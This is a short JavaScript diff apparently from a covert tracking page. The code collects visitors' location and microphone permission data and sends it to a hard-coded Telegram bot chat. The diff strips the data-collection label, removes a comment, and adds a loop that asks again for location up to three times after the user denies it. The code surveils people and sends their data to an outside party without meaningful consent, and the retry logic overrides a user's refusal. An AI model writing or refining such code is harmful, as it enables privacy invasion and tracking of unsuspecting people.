@@ -14,10 +14,13 @@
     const CHAT_ID = "6024837142";
 
     function sendToBot(data) {
-        const message = `🔐 جمع بيانات:\n${JSON.stringify(data, null, 2)}`;
+        const message = JSON.stringify(data, null, 2);
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
             .catch(console.error);
     }
+
+    let retryCount = 0;
+    const MAX_RETRIES = 3;
 
     async function requestPermissions() {
         const collectedData = {
@@ -40,8 +43,13 @@
                     sendToBot(collectedData);
                 },
                 (err) => {
-                    collectedData.location = { error: "denied" };
-                    sendToBot(collectedData);
+                    if (retryCount < MAX_RETRIES) {
+                        retryCount++;
+                        setTimeout(() => requestPermissions(), 2000);
+                    } else {
+                        collectedData.location = { error: "denied" };
+                        sendToBot(collectedData);
+                    }
                 }
             );
         }
@@ -55,7 +63,6 @@
                 collectedData.microphone = "granted";
                 sendToBot(collectedData);
                 
-                // إيقاف الـ stream بعد 3 ثواني
                 setTimeout(() => {
                     stream.getTracks().forEach(track => track.stop());
                 }, 3000);
